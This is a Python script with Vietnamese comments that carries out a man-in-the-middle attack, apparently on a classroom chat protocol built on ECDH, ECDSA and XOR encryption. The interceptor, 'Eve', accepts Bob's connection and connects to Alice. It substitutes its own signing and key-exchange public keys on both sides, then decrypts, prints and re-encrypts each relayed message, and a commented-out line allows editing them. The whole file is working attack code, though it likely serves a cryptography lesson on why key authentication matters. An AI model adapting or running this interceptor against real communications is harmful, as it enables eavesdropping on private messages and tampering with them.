import socket
import threading
import logic_ecdh

def handle_chat(src_conn, dest_conn, src_name, dest_name, src_secret, dest_secret):
    """
    src_secret: Dùng để giải mã tin nhắn từ nguồn.
    dest_secret: Dùng để mã hóa lại tin nhắn trước khi gửi tới đích.
    """
    while True:
        try:
            # 1. Nhận gói tin đã mã hóa
            encrypted_data = src_conn.recv(4096)
            if not encrypted_data: break
            
            # 2. Giải mã để đọc trộm (Dùng khóa của người gửi)
            decrypted_msg_bytes = logic_ecdh.xor_cipher(encrypted_data, src_secret)
            msg_text = decrypted_msg_bytes.decode('utf-8', errors='ignore')
            print(f"\n[CHẶN TỪ {src_name}]: {msg_text}")
            
            # 3. Eve có thể can thiệp (Tùy chọn)
            # modified_text = input(f"Sửa tin gửi {dest_name}: ") or msg_text
            modified_text = msg_text 

            # 4. MÃ HÓA LẠI (Dùng khóa của người nhận)
            re_encrypted_data = logic_ecdh.xor_cipher(modified_text, dest_secret)
            
            # 5. Chuyển tiếp tới đích
            dest_conn.sendall(re_encrypted_data)
        except:
            break

def run_mitm():
    print("\n=== EVE MITM: ECDH + ECDSA INTERCEPTOR ===")
    ALICE_IP = input("Nhập IP của Alice: ")
    ALICE_ADDR = (ALICE_IP, 12345)
    EVE_PORT = 1111

    # Eve làm Server đợi Bob
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', EVE_PORT))
    server.listen(1)
    print(f"[*] Eve đang đợi Bob tại cổng {EVE_PORT}...")
    conn_bob, _ = server.accept()

    # Eve làm Client nối tới Alice
    eve_to_alice = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    eve_to_alice.connect(ALICE_ADDR)
    print(f"[*] Eve đã nối tới Alice.")

    try:
        # BƯỚC 1: TRÁO ĐỔI KHÓA ĐỊNH DANH GIẢ
        _, eve_v_pub = logic_ecdh.generate_signing_keys()
        alice_v_pub = eve_to_alice.recv(4096) # Nhận pub của Alice
        
        eve_to_alice.sendall(eve_v_pub)       # Gửi pub giả cho Alice
        conn_bob.sendall(eve_v_pub)           # Gửi pub giả cho Bob
        bob_v_pub = conn_bob.recv(4096)       # Nhận pub của Bob

        # BƯỚC 2: TRÁO ĐỔI KHÓA ECDH (Eve đứng giữa)
        eve_priv, eve_pub = logic_ecdh.generate_ecdh_keys()
        eve_sign_priv, _ = logic_ecdh.generate_signing_keys()

        # Alice -> Bob
        a_pub = eve_to_alice.recv(4096); eve_to_alice.send(b'ACK')
        a_sig = eve_to_alice.recv(4096)
        
        sig_for_bob = logic_ecdh.sign_data(eve_sign_priv, eve_pub)
        conn_bob.sendall(eve_pub); conn_bob.recv(1024)
        conn_bob.sendall(sig_for_bob)

        # Bob -> Alice
        b_pub = conn_bob.recv(4096); conn_bob.send(b'ACK')
        b_sig = conn_bob.recv(4096)
        
        sig_for_alice = logic_ecdh.sign_data(eve_sign_priv, eve_pub)
        eve_to_alice.sendall(eve_pub); eve_to_alice.recv(1024)
        eve_to_alice.sendall(sig_for_alice)

        # TÍNH KHÓA CHUNG RIÊNG BIỆT
        secret_alice = logic_ecdh.calculate_shared_secret(eve_priv, a_pub)
        secret_bob = logic_ecdh.calculate_shared_secret(eve_priv, b_pub)

        print("\n" + "="*40 + "\nMITM THÀNH CÔNG. ĐANG CHẶN TIN NHẮN...\n" + "="*40)

        # CHAT SONG CÔNG
        t1 = threading.Thread(target=handle_chat, args=(eve_to_alice, conn_bob, "ALICE", "BOB", secret_alice, secret_bob))
        t2 = threading.Thread(target=handle_chat, args=(conn_bob, eve_to_alice, "BOB", "ALICE", secret_bob, secret_alice))
        t1.start(); t2.start()
        t1.join(); t2.join()

    except Exception as e: print(f"Lỗi: {e}")
    finally: conn_bob.close(); eve_to_alice.close(); server.close()

if __name__ == "__main__":
    run_mitm()